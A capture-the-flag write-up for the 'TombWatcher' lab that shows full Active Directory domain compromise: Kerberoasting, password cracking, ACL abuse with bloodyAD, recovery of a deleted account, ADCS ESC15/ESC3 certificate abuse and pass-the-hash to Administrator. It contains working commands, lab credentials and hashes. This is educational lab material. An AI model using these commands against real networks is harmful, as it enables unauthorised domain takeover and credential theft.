
## CTF Writeup: TombWatcher

---
## Credentials

The Lab itself provides us with domain user credentials.

```
henry:H3nry_987TGV!
```
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.76.216 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-26 08:37 -0500
Nmap scan report for 10.129.76.216
Host is up (0.030s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-26 17:39:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-26T17:40:42+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-09-26T17:29:46
|_Not valid after:  2027-09-26T17:29:46
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-26T17:40:42+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-09-26T17:29:46
|_Not valid after:  2027-09-26T17:29:46
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-26T17:40:42+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-09-26T17:29:46
|_Not valid after:  2027-09-26T17:29:46
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-26T17:40:42+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2026-09-26T17:29:46
|_Not valid after:  2027-09-26T17:29:46
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
53858/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-26T17:40:04
|_  start_date: N/A
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.04 seconds
```

The TCP Scan revealed that the target seems to be an DC. Since 53, 88 & 389 is running. The scan also provides us with information about the Hostname of the DC "DC01", the FQDN "DC01.tombwatcher.htb", the name of the domain "tombwatcher.htb". Mapped them all to the target ip address in our local dns file. 

```
echo "10.129.76.216 DC01.tombwatcher.htb tombwatcher.htb DC01" | tee -a /etc/hosts
```

Enumerated RID's / Users using the tool nxc and stored the output inside an newusers.txt file.

```
nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --rid-brute > newusers.txt
```

Formatted the newusers.txt file and stored the output inside an users.txt for formatting for future bruteforce attempts.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Sprayed users for hits of the same password as the henry user, but couldn't find anything useful.

```
nxc smb tombwatcher.htb -u users.txt -p passwords.txt --continue-on-success
```

Before trying to query ldap information or checking out the SMB Shares, let's download domain information onto local machine and spin up an local BloodHound Instance to map potential ACL Attacks and the attack surface.

```
bloodhound-python -u "henry" -p 'H3nry_987TGV!' -ns 10.129.76.216 -d tombwatcher.htb -c all
```

Started up local bloodhound instance and uploaded domain information.

```
bloodhound-start
```

##### WriteSPN ACL

Marked current user "henry" as owned and checked out his outbound object controls. 

My Decision Making was right in this instance, as we can see user "henry" has the ACL "WriteSPN" set for user "alfred".

BloodHound gives us the information that we can utilize an targetedKerberoast Attack to abuse this.

Executed the following command:

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-host dc01.tombwatcher.htb
```

We got an Clock Skew Error, let's fix this real quick.

```
sudo timedatectl set-ntp off 
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u 10.129.76.222
```

Rerun the command and retrieved the TGT Hash.

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -f hashcat --dc-host dc01.tombwatcher.htb
```

Stored the TGT for user alfred on an local file and bruteforced an password out of the hash using john the ripper.

```
john alfred_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2026-09-26 13:35) 25.00g/s 51200p/s 51200c/s 51200C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
alfred:basketball
```

Stored the new password inside our passwords.txt on my local machine and sprayed users for credentials, but only was able to find a hit for alfred and henry.

```
nxc smb tombwatcher.htb -u users.txt -p passwords.txt --continue-on-success
```

##### AddSelf ACL

Marked user alfred as owned. Alfred seems to be having the AddSelf ACL set for the Infrastructure Group.

Utilized bloodyad to add alfred to the Infrastructure Group.

```
bloodyad -u alfred -p 'basketball' -d tombwatcher.htb -H 10.129.76.222 add groupmember 'Infrastructure' alfred
```

#### ReadGMSAPassword ACL

Checked outbound object controls and the Infrastructure Group has the ReadGMSAPassword ACL set for the ansible_dev$ user.

This allows us to retrieve the NT Hash for the ansible_dev$ user.

```
bloodyad --host 10.129.76.222 -d tombwatcher.htb -u alfred -p 'basketball' get object 'ansible_dev$' --attr msDS-ManagedPassword
```

```
ansible_dev$:3eca34dd13a85db79c03178b7b149621
```

#### ForceChangePassword ACL

ansible_dev$ has ForceChangePassword ACL on user "sam". Which allows us to change the password of user sam. Let's abuse it.

```
bloodyad -u ansible_dev$ -p :3eca34dd13a85db79c03178b7b149621 -d tombwatcher.htb --host dc01.tombwatcher.htb set password sam 'Password123!'
```

Verified the password change:

```
nxc smb tombwatcher.htb -u sam -p 'Password123!'
SMB         10.129.76.222   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                     
SMB         10.129.76.222   445    DC01             [+] tombwatcher.htb\sam:Password123!
```

#### WriteOwner ACL

User Sam also has WriteOwner ACL on user "john" which allows us to modify ownership of the object.

```
bloodyAD — host 10.129.76.222 -d tombwatcher.htb -u "sam" -p 
'Password123!' set owner "john" "sam"
```

This modified the OwnerSid for the user.

Let's now set GenericAll for user sam over user john!

```
/usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:'Password123!'
```

Now we can change the password of user john.

```
bloodyad -H 10.129.76.222 -d tombwatcher.htb -u "sam" -p 'Password123!' set password "john" "pass123"
```

Verified the password change.

```
nxc smb tombwatcher.htb -u john -p 'pass123' 
SMB         10.129.76.222   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                     
SMB         10.129.76.222   445    DC01             [+] tombwatcher.htb\john:pass123
```

User john seems to be part of the Remote Management User Group, which means we should be able to connect to the DC with his credentials. He also has another interesting ACL set "GenericAll" onto ADCS OU. This OU affects an Tier Zero Domain Policy Object.

But before trying to abuse it, let's connect to the DC via evil-winrm.

```
evil-winrm -i dc01.tombwatcher.htb -u john -p pass123
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                     
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\john\Documents>
```

Retrieved user.txt in C:\Users\john\Desktop.

```
9b7b2ca13837d0ca3a8349f37914152d
```

## Privilege Escalation

Enumerated user john's groups and permissions, but looks very empty. Went over the filesystem of the DC and it looks quite empty aswell. Let's proceed with abusing the ACL we have over the ADCS OU.

#### GenericAll ACL

From here on I was stuck, so I had to research. Apparently I need to install domain information with rusthound-ce.

```
rusthound-ce --domain tombwatcher.htb -u john -p 'pass123'
```

Uploaded the domain information onto my local bloodhound instance.

Now when inspecting our current user "john" we have more ACL's including an GenericAll for "cert_admin" user.

Let's abuse it, by changing user cert_admin's password.

```
bloodyad --host 10.129.76.222 -d tombwatcher.htb -u john -p 'pass123' set password 'cert_admin' 'unknown123'
```

This error'd out and told us that there is no object found, which is kinda odd.

Had to make research from here. Apparently the cert_admin account user doesn't exist anymore or got deleted. In Active Directory objects get deleted permanently. But if Recycle Bin is setup in AD, the Objects get transfered there. We can enumerate the Recycle Bin and potentially recover the cert_admin ad user from there.

As we can see Recycle Bin is active on this domain.

```
Get-ADOptionalFeature 'Recycle Bin Feature'


DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=tombwatcher,DC=htb, CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : 907469ef-52c5-41ab-ad19-5fdec9e45082
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```

Listed all deleted items.

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

Deleted           : True                                             
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb                
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb                    
Name              : cert_admin                                       
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3         
ObjectClass       : user                                             
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3             
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1109                                                                                      
Deleted           : True                                             
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb                
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb                    
Name              : cert_admin                                       
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1110

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

There seems to be the cert_admin deleted three the last one is the correct one since he is the latest deleted one and we also see that the LastKnownParent was the ADCS OU! Which our current user john has GenericAll over. This means our current user should be able to restore the cert_admin user.

```
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Verified if the cert_admin user is restored. He is!

```
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Alfred                   cert_admin
Guest                    Henry                    john
krbtgt                   sam
The command completed with one or more errors.
```

Since user john also has GenericAll over the cert_admin user itself, let's now change his password.

```
bloodyad --host 10.129.76.222 -d tombwatcher.htb -u john -p 'pass123' set password 'cert_admin' 'zebra123'
```

Verified the change and it worked.

```
nxc smb tombwatcher.htb -u 'cert_admin' -p 'zebra123'
```

Marked cert_admin as owned.

Let's enumerate any vulnerable templates with the cert_admin and certipy-ad.

```
certipy-ad find -u cert_admin -p 'zebra123' -dc-ip 10.129.76.222 -target tombwatcher.htb -vulnerable -enabled
```

The output of the scan reveals that the Template "WebServer" is vulnerable to ESC15 and our current user cert_admin is able to Enrollment Permissions and Write Property Enroll on the template.

It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. If the CA has not been updated with the relevant security patches (Nov 2024), it will incorrectly include these attacker-supplied Application Policies in the issued certificate. This occurs even if these policies are not defined in, or are inconsistent with, the template’s intended Extended Key Usages (EKUs), thereby granting the certificate unintended capabilities.

The key indicators are:

- Enrollee Supplies Subject is True
- Schema Version is 1
- Not patched for CVE-2024-49019

There are two scenarios for exploitation.
###### ESC15

1. Request certificate as the administrator injecting that this certificate has the "Certificate Request Agent" property set.

```
certipy-ad req -u cert_admin -p 'zebra123' -dc-ip 10.129.76.222 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
```

This gave us the administrator.pfx which is an bundle of certificates.

I can basically complete the ESC3 Attack, by leveraging the retrieved pfx to request a ticket as Administrator for a template that is meant for user login:

2. First changed the name of our current .pfx file to avoid issues.

```
mv administrator.pfx cert_admin.pfx
```

3. Request Administrator Certificate with which I can authenticate

```
certipy-ad req -u cert_admin -p 'zebra123' -dc-ip 10.129.76.222 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

4. Auth with the certificate to get the NTLM Hash of Administrator

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.76.222
```

Connected to DC01 using psexec.

```
impacket-psexec Administrator@dc01.tombwatcher.htb -hashes aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
6d37a080e6a869f65d3a8d5e491e40a9
```